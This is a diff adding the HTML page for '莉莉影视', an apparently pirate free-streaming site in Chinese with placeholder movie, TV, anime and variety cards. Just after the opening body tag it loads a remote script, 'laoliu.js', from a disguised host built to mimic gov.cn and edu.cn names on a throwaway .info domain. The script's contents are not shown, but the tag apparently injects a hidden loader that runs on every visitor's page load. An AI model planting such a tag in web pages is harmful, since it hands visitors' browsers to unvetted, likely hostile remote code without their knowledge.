@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>莉莉影视 - 免费高清电影电视剧动漫综艺在线观看</title>
+<meta name="description" content="莉莉影视提供最新电影、热播电视剧、动漫、综艺高清在线免费观看，移动端自适应，每日更新，畅享海量影视资源。">
+<meta name="keywords" content="莉莉影视,免费看影视,免费电影,在线电视剧,动漫在线看,综艺免费看">
+<link rel="canonical" href="https://liliyingshi-h5.github.io/">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei",sans-serif;
+  background:#fff5f8;color:#3a2c33;line-height:1.7;
+}
+a{text-decoration:none;color:inherit}
+img{max-width:100%;display:block}
+section[id]{scroll-margin-top:64px}
+
+/* 顶部 */
+.lili-top{
+  position:sticky;top:0;z-index:999;
+  background:rgba(255,255,255,.9);
+  backdrop-filter:blur(8px);
+  border-bottom:1px solid #ffd6e7;
+}
+.lili-top-in{
+  max-width:1200px;margin:0 auto;height:60px;
+  padding:0 16px;display:flex;align-items:center;justify-content:space-between;
+}
+.lili-logo{font-size:20px;font-weight:800;color:#ff5b8d}
+.lili-logo b{color:#ff8fb3}
+.lili-nav{display:flex;gap:16px}
+.lili-nav a{font-size:14px;color:#7a6570}
+.lili-nav a:hover{color:#ff5b8d}
+
+/* Hero */
+.lili-hero{
+  padding:80px 16px 60px;text-align:center;
+  background:
+    radial-gradient(800px 300px at 20% 0%,#ffe3ef,transparent),
+    radial-gradient(800px 300px at 80% 20%,#ffe9f3,transparent),
+    #fff5f8;
+}
+.lili-hero h1{font-size:32px;font-weight:900;color:#ff4f87;margin-bottom:12px}
+.lili-hero p{max-width:640px;margin:0 auto 22px;color:#7a6570;font-size:16px}
+.lili-btn{
+  display:inline-block;padding:12px 30px;border-radius:30px;
+  background:linear-gradient(135deg,#ff7eb3,#ff5b8d);color:#fff;font-weight:700;
+}
+.lili-btn:hover{opacity:.92}
+
+/* 主体两栏 */
+.lili-main{
+  max-width:1200px;margin:0 auto;padding:50px 16px;
+  display:grid;grid-template-columns:240px 1fr;gap:24px;
+}
+.lili-side{
+  background:#fff;border:1px solid #ffd6e7;border-radius:16px;
+  padding:18px;height:fit-content;
+}
+.lili-side h3{font-size:14px;color:#ff5b8d;margin:14px 0 8px}
+.lili-side a{
+  display:block;font-size:13px;color:#7a6570;
+  padding:6px 10px;border-radius:8px;
+}
+.lili-side a:hover{background:#ffe9f1;color:#ff4f87}
+
+.lili-content{min-width:0}
+.lili-block{margin-bottom:46px}
+.lili-block-head{
+  display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;
+}
+.lili-block-head h2{font-size:20px;color:#ff4f87}
+.lili-block-head h2 i{margin-right:8px}
+.lili-block-head a{font-size:13px;color:#b07c93}
+.lili-block-head a:hover{color:#ff5b8d}
+
+/* 电影卡片流 */
+.lili-grid{
+  display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:16px;
+}
+.lili-card{
+  background:#fff;border:1px solid #ffe0ec;border-radius:14px;overflow:hidden;
+  transition:.3s;
+}
+.lili-card:hover{transform:translateY(-6px);box-shadow:0 12px 24px rgba(255,91,141,.18)}
+.lili-card img{height:210px;object-fit:cover}
+.lili-card .txt{padding:10px}
+.lili-card .txt h3{font-size:14px;color:#3a2c33}
+.lili-card .txt p{font-size:12px;color:#9a8591;margin-top:4px}
+
+/* 电视剧：列表 */
+.lili-list{
+  background:#fff;border:1px solid #ffe0ec;border-radius:14px;
+  padding:14px;display:flex;gap:14px;margin-bottom:14px;
+}
+.lili-list img{width:96px;height:130px;object-fit:cover;border-radius:10px}
+.lili-list h3{font-size:15px;color:#3a2c33}
+.lili-list p{font-size:13px;color:#8a7682;margin-top:6px}
+.lili-list span{display:inline-block;margin-top:8px;font-size:12px;color:#ff5b8d;background:#ffe9f1;padding:2px 8px;border-radius:20px}
+
+/* 动漫：标签墙 */
+.lili-tags{display:flex;flex-wrap:wrap;gap:12px}
+.lili-tag{
+  background:#fff;border:1px solid #ffd6e7;border-radius:12px;
+  padding:14px 18px;font-size:14px;color:#ff4f87;font-weight:600;
+}
+.lili-tag:hover{background:#ffe9f1}
+
+/* 综艺：杂志块 */
+.lili-mag{
+  display:grid;grid-template-columns:1.4fr 1fr;gap:16px;
+}
+.lili-mag .big{
+  border-radius:16px;overflow:hidden;position:relative;min-height:260px;
+}
+.lili-mag .sm{
+  border-radius:16px;overflow:hidden;position:relative;min-height:122px;
+}
+.lili-mag img{position:absolute;inset:0;width:100%;height:100%;object-fit:cover}
+.lili-mag .mask{
+  position:absolute;inset:0;
+  background:linear-gradient(180deg,transparent 40%,rgba(0,0,0,.7));
+  display:flex;align-items:flex-end;padding:14px;
+}
+.lili-mag .mask h3{color:#fff;font-size:15px}
+
+/* 关于 */
+.lili-about{
+  background:#fff;border:1px solid #ffd6e7;border-radius:16px;padding:24px;
+}
+.lili-about h2{font-size:20px;color:#ff4f87;margin-bottom:12px}
+.lili-about p{font-size:15px;color:#7a6570;margin-bottom:10px}
+.lili-about .url{color:#ff5b8d;font-weight:700}
+.lili-stats{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-top:18px}
+.lili-stat{
+  background:#fff0f6;border:1px solid #ffd6e7;border-radius:12px;
+  padding:16px;text-align:center;
+}
+.lili-stat b{display:block;font-size:20px;color:#ff5b8d}
+.lili-stat span{font-size:12px;color:#9a8591}
+
+/* 页脚 */
+.lili-foot{
+  border-top:1px solid #ffd6e7;padding:28px 16px;text-align:center;
+  color:#9a8591;font-size:13px;background:#fff;
+}
+.lili-foot a{color:#b07c93;margin:0 6px}
+.lili-foot a:hover{color:#ff5b8d}
+
+@media(max-width:860px){
+  .lili-main{grid-template-columns:1fr}
+  .lili-side{display:flex;flex-wrap:wrap;gap:6px}
+  .lili-side h3{width:100%}
+  .lili-side a{padding:6px 12px;background:#fff0f6;border-radius:20px}
+  .lili-mag{grid-template-columns:1fr}
+  .lili-stats{grid-template-columns:1fr 1fr}
+  .lili-hero h1{font-size:26px}
+  .lili-nav{display:none}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- 顶部导航 -->
+<div class="lili-top">
+  <div class="lili-top-in">
+    <div class="lili-logo">莉莉<b>影视</b></div>
+    <nav class="lili-nav">
+      <a href="#home">首页</a>
+      <a href="#movie">电影</a>
+      <a href="#tv">电视剧</a>
+      <a href="#anime">动漫</a>
+      <a href="#variety">综艺</a>
+      <a href="#about">关于</a>
+    </nav>
+  </div>
+</div>
+
+<!-- Hero -->
+<header class="lili-hero" id="home">
+  <h1>莉莉影视 · 免费高清影视随时看</h1>
+  <p>莉莉影视聚合电影、电视剧、动漫、综艺资源，手机电脑都能看，更新快、画质高、界面清爽。</p>
+  <a href="#movie" class="lili-btn">开始免费观影</a>
+</header>
+
+<!-- 主体 -->
+<div class="lili-main">
+
+  <!-- 侧边筛选 -->
+  <aside class="lili-side">
+    <h3>类型</h3>
+    <a href="#">爱情</a>
+    <a href="#">喜剧</a>
+    <a href="#">动作</a>
+    <a href="#">悬疑</a>
+    <a href="#">科幻</a>
+    <a href="#">动画</a>
+    <h3>地区</h3>
+    <a href="#">国产</a>
+    <a href="#">韩剧</a>
+    <a href="#">美剧</a>
+    <a href="#">日剧</a>
+    <a href="#">泰剧</a>
+    <h3>年份</h3>
+    <a href="#">2024</a>
+    <a href="#">2023</a>
+    <a href="#">2022</a>
+    <a href="#">经典老片</a>
+  </aside>
+
+  <!-- 内容区 -->
+  <main class="lili-content">
+
+    <!-- 电影 -->
+    <section class="lili-block" id="movie">
+      <div class="lili-block-head">
+        <h2><i>🎬</i>最新电影</h2>
+        <a href="#">更多 #</a>
+      </div>
+      <div class="lili-grid">
+        <div class="lili-card"><img src="https://picsum.photos/300/420?random=201" alt="电影"><div class="txt"><h3>电影名称一</h3><p>爱情 / 2024 / 8.9分</p></div></div>
+        <div class="lili-card"><img src="https://picsum.photos/300/420?random=202" alt="电影"><div class="txt"><h3>电影名称二</h3><p>喜剧 / 2024 / 8.6分</p></div></div>
+        <div class="lili-card"><img src="https://picsum.photos/300/420?random=203" alt="电影"><div class="txt"><h3>电影名称三</h3><p>动作 / 2023 / 9.0分</p></div></div>
+        <div class="lili-card"><img src="https://picsum.photos/300/420?random=204" alt="电影"><div class="txt"><h3>电影名称四</h3><p>悬疑 / 2024 / 8.7分</p></div></div>
+        <div class="lili-card"><img src="https://picsum.photos/300/420?random=205" alt="电影"><div class="txt"><h3>电影名称五</h3><p>科幻 / 2024 / 8.8分</p></div></div>
+        <div class="lili-card"><img src="https://picsum.photos/300/420?random=206" alt="电影"><div class="txt"><h3>电影名称六</h3><p>动画 / 2023 / 8.4分</p></div></div>
+      </div>
+    </section>
+
+    <!-- 电视剧 -->
+    <section class="lili-block" id="tv">
+      <div class="lili-block-head">
+        <h2><i>📺</i>热播电视剧</h2>
+        <a href="#">更多 #</a>
+      </div>
+      <div class="lili-list">
+        <img src="https://picsum.photos/200/280?random=211" alt="剧">
+        <div>
+          <h3>电视剧名称一</h3>
+          <p>都市情感剧，剧情细腻，角色冲突强烈，适合追更。</p>
+          <span>更新至30集</span>
+        </div>
+      </div>
+      <div class="lili-list">
+        <img src="https://picsum.photos/200/280?random=212" alt="剧">
+        <div>
+          <h3>电视剧名称二</h3>
+          <p>古装权谋大剧，服化道精致，口碑持续上涨。</p>
+          <span>全40集</span>
+        </div>
+      </div>
+      <div class="lili-list">
+        <img src="https://picsum.photos/200/280?random=213" alt="剧">
+        <div>
+          <h3>电视剧名称三</h3>
+          <p>悬疑刑侦剧，反转密集，节奏紧凑不拖沓。</p>
+          <span>更新至18集</span>
+        </div>
+      </div>
+    </section>
+
+    <!-- 动漫 -->
+    <section class="lili-block" id="anime">
+      <div class="lili-block-head">
+        <h2><i>🎨</i>动漫专区</h2>
+        <a href="#">更多 #</a>
+      </div>
+      <div class="lili-tags">
+        <a href="#" class="lili-tag">热血番</a>
+        <a href="#" class="lili-tag">恋爱番</a>
+        <a href="#" class="lili-tag">治愈番</a>
+        <a href="#" class="lili-tag">国漫推荐</a>
+        <a href="#" class="lili-tag">日漫新番</a>
+        <a href="#" class="lili-tag">完结神作</a>
+        <a href="#" class="lili-tag">少女漫画改</a>
+        <a href="#" class="lili-tag">战斗番</a>
+      </div>
+    </section>
+
+    <!-- 综艺 -->
+    <section class="lili-block" id="variety">
+      <div class="lili-block-head">
+        <h2><i>🎤</i>热门综艺</h2>
+        <a href="#">更多 #</a>
+      </div>
+      <div class="lili-mag">
+        <div class="big">
+          <img src="https://picsum.photos/800/600?random=221" alt="综艺">
+          <div class="mask"><h3>户外旅行综艺：一起去看世界</h3></div>
+        </div>
+        <div class="sm">
+          <img src="https://picsum.photos/400/300?random=222" alt="综艺">
+          <div class="mask"><h3>音乐现场秀</h3></div>
+        </div>
+        <div class="sm">
+          <img src="https://picsum.photos/400/300?random=223" alt="综艺">
+          <div class="mask"><h3>美食探店记</h3></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 关于 -->
+    <section class="lili-block" id="about">
+      <div class="lili-block-head">
+        <h2><i>💗</i>关于莉莉影视</h2>
+      </div>
+      <div class="lili-about">
+        <h2>莉莉影视是什么？</h2>
+        <p>莉莉影视是一个轻量、清爽的影视聚合展示站，覆盖电影、电视剧、动漫、综艺等常见品类，适合手机端快速找片。</p>
+        <p>页面采用响应式布局，栏目结构清晰，方便搜索引擎理解站点主题与内容层次。</p>
+        <p>官方地址：<span class="url">https://liliyingshi-h5.github.io</span></p>
+        <div class="lili-stats">
+          <div class="lili-stat"><b>10000+</b><span>影视内容</span></div>
+          <div class="lili-stat"><b>每日</b><span>更新资源</span></div>
+          <div class="lili-stat"><b>手机</b><span>自适应浏览</span></div>
+          <div class="lili-stat"><b>免费</b><span>在线观看</span></div>
+        </div>
+      </div>
+    </section>
+
+  </main>
+</div>
+
+<!-- 页脚 -->
+<footer class="lili-foot">
+  <div>
+    <a href="#home">首页</a>|
+    <a href="#movie">电影</a>|
+    <a href="#tv">电视剧</a>|
+    <a href="#anime">动漫</a>|
+    <a href="#variety">综艺</a>|
+    <a href="#about">关于</a>
+  </div>
+  <p style="margin-top:10px">© 2024 莉莉影视 · 网站网址：https://liliyingshi-h5.github.io</p>
+</footer>
+
+</body>
+</html>
